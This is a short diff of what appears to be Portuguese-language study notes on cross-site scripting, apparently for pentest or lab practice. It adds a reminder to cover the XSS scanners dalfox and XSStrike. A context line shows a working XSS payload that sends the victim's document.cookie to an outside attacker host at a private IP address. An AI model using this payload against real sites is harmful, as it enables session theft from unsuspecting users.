@@ -158,3 +158,4 @@ a.send();
 "><script>new Image().src='http://10.10.15.190:8080/index.php?c='+document.cookie</script>
 ```
 
+falar ainda sobre dalfox e xss strike
